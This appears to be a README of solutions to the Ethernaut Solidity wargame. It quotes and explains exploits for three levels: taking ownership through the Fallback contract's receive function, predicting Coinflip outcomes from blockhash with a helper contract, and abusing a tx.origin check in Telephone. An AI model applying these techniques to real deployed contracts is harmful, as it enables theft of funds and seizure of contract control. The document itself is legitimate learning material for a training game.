# ethernaut-solutions
Solutions for the Ethernaut (Web3/Solidity based wargame)

### Fallback 
This contract has two methods when we can use in order to solve the challenge: contribute and receive.
```solidity 
 function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```
With <b>contribute()</b> only we need to pass this conditicion `if(contributions[msg.sender] > contributions[owner])`
But, this function only accept values < 0.001 ether and right now after the contract has deployed `contributions[owner]) has 1000 ether, so in this case it is not posible.


```solidity 
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
With <b>receive()</b> we need to pass this condition `require(msg.value > 0 && contributions[msg.sender] > 0);` For that is necesary to make a contribution > 0 and < 0.001.


### Coinflip
In the ethernaut game we can see the following. To complete this level you'll `need to use your psychic abilities to guess the correct outcome 10 times in a row`.
```solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
```
We need to pass this condition 10 times :  `if (side == _guess) {` but side depends of the value of coinflip and
`coinFlip = blockValue / FACTOR`; so we need to check this </br>
coinFlip = uint256(blockhash(block.number - 1)) / FACTOR  </br>
where FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

<br/> for that reason we are going to create a contract pointing instance of the deployed Coinflip and recreate flip function to generate the guess value.
```solidity
function flipGuess() external {
    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 division = blockValue / factor;
    bool guess = division == 1 ? true : false;
    coinFlipContract.flip(guess);
}
```

### Telephone
In the contract Telephone the function changeOwner is public and can be invoked fron any contrac

```solidity 
function changeOwner(address _owner) public { ..}
```
In order to hack the contract we need to focus on this condition
```solidity 
   if (tx.origin != msg.sender) {
      owner = _owner;
   }
```
Both `tx.origin` and `msg.sender` are global variables
tx.origin refers to address of the Externally Owned Account that originally sent the call (or start the transaction).
msg.sender refers to the address that has called or initiated a function or created a transaction.
